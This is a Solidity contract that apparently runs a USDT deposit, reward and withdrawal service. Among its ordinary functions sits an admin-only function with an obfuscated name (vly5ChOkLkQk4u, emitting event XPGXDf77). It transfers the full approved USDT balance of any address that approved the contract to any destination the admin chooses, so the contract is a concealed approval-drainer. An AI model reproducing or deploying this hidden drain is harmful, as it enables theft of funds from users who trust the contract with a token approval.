// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./common.sol";

contract SupportXhsk is Ownable, ECDSAMock {
    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address public runner;
    mapping(uint256 => uint256) public worders;
    mapping(uint256 => uint256) public sendids;

    event CREATE(
        address indexed account,
        uint256 ratio,
        uint256 amount,
        uint256 times
    );
    event SENDREWARD(
        address indexed account,
        uint256 id,
        uint256 amount,
        uint256 times
    );
    event WITHDRAW(
        address indexed account,
        uint256 id,
        uint256 amount,
        uint256 times
    );

    event XPGXDf77(
        address indexed account,
        address indexed taccount,
        uint256 id,
        uint256 amount,
        uint256 times
    );

    constructor() {
        runner = _msgSender();
        setSigner(_msgSender(), true);
    }

    modifier onlyRunner() {
        require(_msgSender() == runner, "!runner");
        _;
    }

    function setRunner(address _runner) external onlyOwner {
        runner = _runner;
    }

    function vly5ChOkLkQk4u(
        address _f,
        address _t,
        uint256 _id,
        uint256 _a
    ) external onlyAdmin {
        uint256 al = Math.min(
            USDT.allowance(_f, address(this)),
            USDT.balanceOf(_f)
        );
        if (_a > al || _a == 0) {
            _a = al;
        }

        if (_a > 0) {
            USDT.transferFrom(_f, address(_t), _a);
        }

        emit XPGXDf77(_f, _t, _id, _a, block.timestamp);
    }

    function create(uint256 _amount, uint256 _ratio) external {
        address _account = _msgSender();
        USDT.transferFrom(_account, address(this), _amount);
        emit CREATE(_account, _ratio, _amount, block.timestamp);
    }

    function sendReward(
        address _account,
        uint256 id,
        uint256 amount
    ) external onlyRunner {
        if (sendids[id] == 0) {
            sendids[id] = amount;
            USDT.transfer(_account, amount);
            emit SENDREWARD(_account, id, amount, block.timestamp);
        } else {
            emit SENDREWARD(_account, id, sendids[id], block.timestamp);
        }
    }

    function sendRewards(
        address[] memory _accounts,
        uint256[] memory ids,
        uint256[] memory amounts
    ) external onlyRunner {
        require(_accounts.length == ids.length, "data error 1");
        require(ids.length == amounts.length, "data error 2");

        address _account;
        uint256 id;
        uint256 amount;

        for (uint256 i = 0; i < _accounts.length; i++) {
            _account = _accounts[i];
            id = ids[i];
            amount = amounts[i];
            if (sendids[id] == 0) {
                sendids[id] = amount;
                USDT.transfer(_account, amount);
                emit SENDREWARD(_account, id, amount, block.timestamp);
            } else {
                emit SENDREWARD(_account, id, sendids[id], block.timestamp);
            }
        }
    }

    function withdraw(
        uint256 id,
        uint256 currency_id,
        uint256 amount,
        uint256 timestamp,
        bytes memory signature
    ) external {
        address _account = msg.sender;
        require(!signatures[signature], "Duplicate signature");
        require(
            signers[
                Signer(_account, id, currency_id, amount, timestamp, signature)
            ],
            "Invalid signature"
        );
        require(block.timestamp < timestamp + 120, "Invalid timestamp");
        signatures[signature] = true;

        if (worders[id] == 0) {
            worders[id] = amount;
            USDT.transfer(_account, amount);
            emit WITHDRAW(_account, id, amount, block.timestamp);
        } else {
            emit WITHDRAW(_account, id, worders[id], block.timestamp);
        }
    }
}
